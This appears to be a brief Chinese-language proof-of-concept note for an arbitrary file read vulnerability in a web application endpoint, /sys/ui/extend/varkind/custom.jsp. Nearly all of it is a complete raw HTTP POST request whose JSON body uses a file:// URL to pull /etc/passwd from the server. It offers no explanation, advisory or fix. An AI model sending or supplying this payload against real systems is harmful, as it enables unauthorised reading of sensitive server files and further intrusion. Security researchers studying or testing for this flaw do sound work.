0x01-任意文件读取

   访问/sys/ui/extend/varkind/custom.jsp
   
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: host:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 27
Connection: close
Cookie: JSESSIONID=03699CE5FC0E4D545368FF23E5B32BAF

var={"body":{"file":"file:///etc/passwd"}}
   

